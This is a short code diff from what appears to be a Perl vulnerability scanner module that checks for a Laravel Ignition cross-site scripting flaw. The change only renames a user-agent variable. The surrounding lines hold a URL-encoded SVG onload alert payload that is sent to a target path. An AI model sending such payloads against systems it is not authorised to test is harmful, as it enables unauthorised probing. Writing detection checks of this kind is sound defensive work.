@@ -23,8 +23,8 @@ package Spellbook::Advisory::Laravel_Ignition_XSS {
 
             my @uuid      = Spellbook::Helper::Generate_UUID -> new(["--version" => 4, "--repeat" => 1]);
             my $payload   = "$target/_ignition/scripts/--%3E%3Csvg%20onload=alert%28$uuid[0]%29%3E";
-            my $userAgent = Spellbook::Core::UserAgent -> new();
-            my $request   = $userAgent -> get($payload);
+            my $user_agent = Spellbook::Core::UserAgent -> new();
+            my $request   = $user_agent -> get($payload);
 
             if (
                 $request -> code() == 500 &&
